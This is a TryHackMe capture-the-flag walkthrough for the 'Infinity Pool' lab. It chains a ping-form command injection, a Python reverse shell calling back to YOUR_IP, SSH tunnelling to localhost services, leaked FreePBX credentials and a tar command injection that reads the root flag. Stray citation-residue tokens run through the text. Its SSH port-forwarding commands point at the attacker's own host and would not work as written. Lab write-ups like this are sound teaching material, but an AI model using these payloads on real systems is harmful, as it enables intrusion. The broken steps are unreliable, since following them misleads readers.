# TryHackMe - Infinity Pool Writeup

> **Platform:** TryHackMe  
> **Machine:** Infinity Pool  
> **Difficulty:** Medium  
> **OS:** Linux

---

# Scenario

> **Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.** :contentReference[oaicite:0]{index=0}

Target IP:

```text
10.49.149.31
```

---

# Information Gathering

As always, the first step is identifying the attack surface by performing a complete TCP port scan.

## Full Port Scan

```bash
nmap -p- 10.49.149.31
```

Output:

```text
22/tcp open ssh
80/tcp open http
```

Only two ports are exposed externally:

- SSH (22)
- HTTP (80)

This immediately suggests that the initial foothold will most likely come from the web application. :contentReference[oaicite:1]{index=1}

---

# Service Enumeration

Next, perform service and version detection.

```bash
nmap -sC -sV -p22,80 10.49.149.31
```

Important findings:

| Port | Service | Version |
|------|----------|---------|
|22|SSH|OpenSSH 9.6p1 Ubuntu|
|80|HTTP|Gunicorn Web Server|

Additional discoveries:

- robots.txt exists
- Two disallowed directories
- Gunicorn backend
- Website title:
  - **Byte Lotus — Stay Noticed**

The robots.txt file is particularly interesting.

```text
/internal/
/status
```

These directories are likely intended for internal functionality and deserve further investigation. :contentReference[oaicite:2]{index=2}

---

# Web Enumeration

Browsing the application presents a modern hotel-themed website called **Byte Lotus**.

The page itself appears mostly static and does not reveal any obvious attack vectors.

Instead of spending too much time manually exploring the homepage, attention shifts toward the hidden paths discovered earlier inside **robots.txt**.

The interesting endpoints are:

```text
/internal
/status
```

---

# Investigating Hidden Endpoints

Visiting **/internal** does not reveal anything immediately useful.

However, navigating to **/status** presents a page capable of accepting user input to perform network connectivity tests (ping functionality).

This immediately raises several possibilities:

- SSRF
- Local File Inclusion (LFI)
- Command Injection

Rather than assuming the vulnerability, each possibility should be tested individually. :contentReference[oaicite:3]{index=3}

---

# Initial Vulnerability Testing

## Testing SSRF

Several SSRF payloads were attempted.

Result:

```text
No successful response.
```

---

## Testing LFI

Common Local File Inclusion payloads were also tested.

Result:

```text
No successful response.
```

Neither SSRF nor LFI appeared exploitable.

---

## JavaScript Injection

Testing with a simple JavaScript payload:

```html
<script>alert(1)</script>
```

Unexpected response:

```text
/bin/sh: 1: Syntax error: "(" unexpected
```

This response is extremely important.

Instead of reflecting HTML or JavaScript back into the browser, the application attempted to execute the supplied input through a shell.

That strongly suggests **OS Command Injection** rather than Cross-Site Scripting. :contentReference[oaicite:4]{index=4}

---

# Confirming Command Injection

A simple separator payload is used.

```bash
; ls
```

Response:

```text
app.py
requirements.txt
static
templates
venv
wsgi.py

ping: usage error: Destination
```

This confirms that arbitrary shell commands are being executed on the server.

The injected `ls` command successfully lists the application's working directory while the original ping command fails afterward.

The web application is vulnerable to **OS Command Injection**. :contentReference[oaicite:5]{index=5}

---

# Gaining Initial Access

With confirmed command execution, the next objective is obtaining an interactive shell.

A Python reverse shell payload is used.

```bash
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
```

Before executing the payload, start a listener on the attacking machine.

```bash
rlwrap nc -lvnp 4445
```

Once the payload executes, a reverse shell is received.

```text
connect to [YOUR_IP] from 10.49.149.31
```

Verify access.

```bash
id
```

Output:

```text
uid=1001(web)
gid=1001(web)
groups=1001(web)
```

Current user:

```bash
whoami
```

```text
web
```

The initial foothold on the target has now been established. :contentReference[oaicite:6]{index=6}

---

# Shell Stabilization

Interactive shells are much easier to work with, so the reverse shell is upgraded.

Spawn a proper bash shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell.

```bash
Ctrl + Z
```

Configure the local terminal.

```bash
stty raw -echo
fg
```

Finally, set a proper terminal type.

```bash
export TERM=xterm
```

The shell is now fully interactive and ready for deeper enumeration. :contentReference[oaicite:7]{index=7}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
robots.txt
    │
    ▼
/status Endpoint
    │
    ▼
OS Command Injection
    │
    ▼
Python Reverse Shell
    │
    ▼
Interactive Shell as web
```

---

**➡️ End of Part 1**

---

# Post Exploitation Enumeration

With an interactive shell as the **web** user, the next objective is to understand the environment and identify possible privilege escalation paths.

During the enumeration, the web application's directory structure appears to contain configuration files that suggest additional backend services may be running.

The application itself seems relatively minimal, so attention shifts toward discovering services that may only be accessible locally.

---

# Enumerating Internal Services

Instead of blindly searching for privilege escalation vectors, enumerate listening ports from within the compromised machine.

```bash
ss -tunlp
```

Output (trimmed):

```text
udp   4569
udp   5060

tcp   22
tcp   80
tcp   9000
tcp   3000
tcp   5038
tcp   3306
tcp   8088
tcp   8089
tcp   8080
```

Immediately, several interesting observations can be made.

Only **ports 22 and 80** were externally accessible during the initial Nmap scan, yet internally multiple additional services are listening only on **localhost (127.0.0.1)**.

These include:

| Port | Observation |
|------|-------------|
|3000|Internal web application|
|3306|MySQL Database|
|5038|Potential management interface|
|8080|HTTP Service|
|8088|Additional internal service|
|8089|Additional internal service|
|9000|Internal web/API service|

This strongly suggests that the machine relies on several internal applications that are intentionally hidden from external users. :contentReference[oaicite:0]{index=0}

---

# Retrieving the User Flag

Before proceeding further, retrieve the user flag.

Navigate to the home directory.

```bash
cd /home
```

List users.

```bash
ls
```

Output:

```text
ubuntu
web
```

Move into the compromised user's home directory.

```bash
cd /home/web
```

List files.

```bash
ls
```

Output:

```text
user.txt
```

Read the flag.

```bash
cat user.txt
```

Output:

```text
THM{n0_v1s1bl3_3dg3}
```

The user flag has now been captured successfully. :contentReference[oaicite:1]{index=1}

---

# Privilege Escalation Enumeration

With user-level access obtained, the focus now shifts toward privilege escalation.

Rather than immediately relying on automated tools, the numerous localhost-only services discovered earlier become the primary target.

The idea is simple:

> If these services are not exposed externally, perhaps they contain administrative functionality intended only for local access.

To investigate them further, a local service scan is performed.

---

# Scanning Localhost

A copy of **Nmap** is transferred to the target machine and used to enumerate the localhost-only ports.

```bash
nmap 127.0.0.1 \
-p8080,8089,8088,3306,5038,3000,9000 \
-sCV -vv
```

Results:

```text
3000/tcp open
3306/tcp open mysql
5038/tcp open
8080/tcp open http
8088/tcp open
8089/tcp open
9000/tcp open
```

The scan confirms that several backend services are active but inaccessible from outside the machine.

Among these, the most interesting ports are:

- **3000**
- **8080**
- **9000**

These are likely web applications or APIs that could expose administrative functionality. :contentReference[oaicite:2]{index=2}

---

# Accessing Internal Services

Since these applications are only listening on **127.0.0.1**, they cannot be accessed directly from the attacking machine.

SSH port forwarding provides a convenient solution.

Forward local port **8087** to the victim's internal **3000** service.

```bash
ssh -N -f -L 127.0.0.1:8087:127.0.0.1:3000 kali@YOUR_IP
```

Once the tunnel is established, browse to:

```text
http://127.0.0.1:8087
```

Instead of a normal webpage, a JSON configuration file is displayed.

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This configuration file reveals several highly valuable pieces of information:

- Internal automation API
- Internal FreePBX portal
- Default credentials
- Telephony password
- Warning that default credentials have not been rotated

This represents a significant pivot point in the attack chain. :contentReference[oaicite:3]{index=3}

---

# Forwarding Additional Services

Since the configuration references an automation API running on **port 9000**, create another SSH tunnel.

```bash
ssh -N -f \
-L 127.0.0.1:7089:127.0.0.1:9000 \
kali@YOUR_IP
```

This exposes the internal API locally.

Browse to:

```text
http://127.0.0.1:7089
```

The internal automation service is now accessible from the attacking machine.

The JSON configuration also references an internal FreePBX portal located at:

```text
http://127.0.0.1:8080/ucp
```

Forwarding this service allows access to the FreePBX User Control Panel using the discovered credentials.

At this stage, the attack has transitioned from a simple web shell into compromising the machine's internal management infrastructure. :contentReference[oaicite:4]{index=4}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
robots.txt
    │
    ▼
OS Command Injection
    │
    ▼
Reverse Shell
    │
    ▼
User Flag
    │
    ▼
Internal Service Enumeration
    │
    ▼
Port Forwarding
    │
    ▼
FreePBX Credentials Discovered
```

---

**➡️ End of Part 2**

---

# Accessing the Internal FreePBX Portal

The JSON configuration discovered on port **3000** revealed credentials for an internal FreePBX User Control Panel (UCP).

```json
{
  "telephony_user": "FreePBXUCPTemplateCreator",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp"
}
```

After forwarding port **8080**, navigate to the internal portal.

```text
http://127.0.0.1:8080/ucp
```

Using the recovered credentials:

```text
Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026
```

Login is successful.

This grants access to an internal management dashboard that was never intended to be exposed externally. :contentReference[oaicite:0]{index=0}

---

# Exploring the Dashboard

After logging into the FreePBX interface, several management options become available.

While exploring the dashboard, one particular section immediately stands out.

It references an **Automation Report Generator**, which communicates with another internal application listening on **port 9000**.

During the inspection of this feature, an **Automation Key** is revealed.

```text
Automation Key

cc_auto_7b3f9a1c4e0d2f6a
```

This token appears to authenticate requests sent to the internal automation service.

At this point, the attack path shifts toward interacting directly with the backend API instead of using the graphical interface. :contentReference[oaicite:1]{index=1}

---

# Interacting with the Automation API

The configuration file previously revealed that the automation endpoint is hosted internally on port **9000**.

After forwarding this service, requests can be made directly.

An initial request is sent using the discovered bearer token.

```bash
curl -s -i \
-X POST http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a"
```

Response:

```http
HTTP/1.1 400 BAD REQUEST
```

Body:

```json
{
  "error":"field 'report' is required"
}
```

Although the request fails, the error message is extremely valuable.

It confirms:

- Authentication works.
- The endpoint is reachable.
- The API expects a parameter named **report**.

Rather than being blocked by authentication, we are now interacting directly with the application's business logic. :contentReference[oaicite:2]{index=2}

---

# Understanding the Export Function

With the required parameter identified, the next objective is understanding how the backend processes the **report** field.

After experimenting with multiple payloads and observing the application's behavior, it becomes clear that the supplied value is incorporated into a command responsible for generating compressed report archives.

Reports are written into:

```text
/var/automation/
```

using archive files such as:

```text
*.tgz
```

This behavior strongly suggests that the application invokes the Linux **tar** command internally.

If user-controlled input is passed directly into that command without proper sanitization, command injection becomes possible.

This is precisely what the subsequent testing confirms. :contentReference[oaicite:3]{index=3}

---

# Command Injection in the Automation Service

A payload is crafted that terminates the expected command before executing an arbitrary shell command.

```bash
curl -s -i \
-X POST http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
-H "Content-Type: application/json" \
-d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

Instead of simply creating an archive, the injected command attempts to read the root flag.

The application responds with:

```http
HTTP/1.1 200 OK
```

indicating that the payload has been accepted and executed. :contentReference[oaicite:4]{index=4}

---

# Confirming Arbitrary Command Execution

The JSON response contains the exact command executed by the backend.

```text
tar czf /var/automation/exports/x.tgz \
/var/automation/data; cat /root/root.txt \
#.tgz /var/automation/data
```

The injected semicolon (`;`) terminates the original **tar** command and allows arbitrary shell commands to execute with the privileges of the automation service.

The trailing hash (`#`) comments out the remainder of the original command, preventing syntax errors.

This is a classic example of **OS Command Injection** caused by unsafely concatenating user input into shell commands. :contentReference[oaicite:5]{index=5}

---

# Reading the Root Flag

The response body also contains the output of the injected command.

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

The remainder of the output simply shows the expected behavior of the original **tar** command.

```text
tar: Removing leading '/' from member names
```

Because the automation process executes with sufficient privileges, no additional privilege escalation is required.

The root flag can be read directly through the vulnerable export functionality. :contentReference[oaicite:6]{index=6}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
robots.txt
    │
    ▼
OS Command Injection
    │
    ▼
Reverse Shell
    │
    ▼
User Flag
    │
    ▼
Internal Enumeration
    │
    ▼
Port Forwarding
    │
    ▼
FreePBX Portal
    │
    ▼
Automation API
    │
    ▼
Bearer Token
    │
    ▼
Command Injection
    │
    ▼
Root Flag
```

---

**➡️ End of Part 3**

---

# Flags

## User Flag

```text
THM{n0_v1s1bl3_3dg3}
```

---

## Root Flag

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

# Complete Attack Path

```text
External Enumeration
        │
        ▼
Nmap Scan
        │
        ▼
Port 80 (Gunicorn)
        │
        ▼
robots.txt
        │
        ▼
/status Endpoint
        │
        ▼
OS Command Injection
        │
        ▼
Reverse Shell (web)
        │
        ▼
Shell Stabilization
        │
        ▼
Internal Enumeration
        │
        ▼
Discover Local Services
        │
        ▼
Port Forwarding
        │
        ▼
Configuration Disclosure
        │
        ▼
FreePBX Credentials
        │
        ▼
FreePBX UCP Login
        │
        ▼
Automation API Discovery
        │
        ▼
Bearer Token
        │
        ▼
Command Injection
        │
        ▼
Read Root Flag
```

---

# Vulnerabilities Identified

| Vulnerability | Impact |
|--------------|--------|
|Sensitive information exposed via `robots.txt`|Revealed hidden application endpoints|
|OS Command Injection|Allowed arbitrary command execution on the server|
|Internal configuration disclosure|Exposed backend services and credentials|
|Default FreePBX credentials|Provided unauthorized access to the internal management panel|
|Improper network segmentation|Critical services exposed to localhost without additional authentication|
|Command Injection in Automation API|Allowed execution of arbitrary commands with elevated privileges|

---

# Tools Used

### Reconnaissance

- Nmap
- Burp Suite
- cURL

### Exploitation

- Python Reverse Shell
- Netcat
- rlwrap
- SSH Port Forwarding

### Enumeration

- ss
- Nmap (Internal Scan)
- Linux Built-in Utilities

---

# Key Commands

## Full Port Scan

```bash
nmap -p- 10.49.149.31
```

---

## Service Enumeration

```bash
nmap -sC -sV -p22,80 10.49.149.31
```

---

## Command Injection Test

```bash
; ls
```

---

## Reverse Shell

```bash
python3 -c 'import os,pty,socket;
s=socket.socket();
s.connect(("YOUR_IP",4445));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("/bin/sh")'
```

---

## Upgrade Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Stabilize Terminal

```bash
stty raw -echo
fg
export TERM=xterm
```

---

## Enumerate Listening Services

```bash
ss -tunlp
```

---

## Internal Port Scan

```bash
nmap 127.0.0.1 \
-p3000,3306,5038,8080,8088,8089,9000 \
-sCV -vv
```

---

## Forward Port 3000

```bash
ssh -N -f \
-L 127.0.0.1:8087:127.0.0.1:3000 \
kali@YOUR_IP
```

---

## Forward Port 9000

```bash
ssh -N -f \
-L 127.0.0.1:7089:127.0.0.1:9000 \
kali@YOUR_IP
```

---

## Automation API Request

```bash
curl -X POST http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <TOKEN>"
```

---

## Exploiting Command Injection

```bash
curl -X POST http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
-d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

---

# Lessons Learned

- Never ignore **robots.txt**, as it can unintentionally reveal hidden administrative functionality.
- Backend services bound to **localhost** should not be considered secure if an attacker gains a foothold on the machine.
- Configuration files frequently expose sensitive information such as credentials, API endpoints, and internal infrastructure details.
- Default credentials should always be changed before deploying production systems.
- User input must never be passed directly into shell commands without strict validation and sanitization.
- SSH port forwarding is an invaluable technique for accessing internal services during post-exploitation.
- Small information disclosures often combine to form a complete attack chain, demonstrating the importance of defense in depth.

---

# Mitigation Recommendations

### Web Application

- Validate and sanitize all user-supplied input.
- Avoid executing shell commands with user-controlled data.
- Prefer native language libraries over shell utilities whenever possible.

### Authentication

- Rotate all default credentials before deployment.
- Enforce strong password policies.
- Implement multi-factor authentication for administrative portals.

### Infrastructure

- Restrict access to internal services using proper firewall rules.
- Separate management interfaces from production networks.
- Disable unnecessary services.

### Secrets Management

- Store credentials securely using a dedicated secrets manager.
- Never expose configuration files containing passwords or API keys.

### Monitoring

- Enable comprehensive logging for command execution.
- Monitor unusual outbound connections.
- Alert on unexpected use of administrative APIs.

---

# Conclusion

Infinity Pool demonstrates how multiple seemingly minor weaknesses can be chained together into a full system compromise.

The attack began with basic reconnaissance and quickly identified a hidden endpoint through **robots.txt**. An **OS Command Injection** vulnerability provided the initial foothold, allowing access as the **web** user. From there, internal service enumeration uncovered several localhost-only applications, which became accessible through SSH port forwarding.

An exposed configuration file leaked internal credentials and backend service details, leading to access to the **FreePBX User Control Panel**. Further exploration revealed an internal automation service protected only by a bearer token. By interacting directly with its API, another **Command Injection** vulnerability was identified, allowing arbitrary command execution and direct access to the root flag.

Although no traditional kernel exploit or SUID abuse was required, the machine highlights how poor input validation, exposed configuration data, default credentials, and insecure internal services can be chained together to achieve complete compromise.

---

# Skills Practiced

- Network Enumeration
- Web Enumeration
- robots.txt Analysis
- Burp Suite Testing
- OS Command Injection
- Reverse Shell Generation
- Shell Stabilization
- Internal Network Enumeration
- Linux Service Enumeration
- SSH Port Forwarding
- FreePBX Enumeration
- API Security Testing
- Command Injection Exploitation
- Linux Post-Exploitation

---

**Machine:** Infinity Pool  
**Platform:** TryHackMe  
**Operating System:** Linux  
**Difficulty:** Medium

---

# Jai Shri Ram 
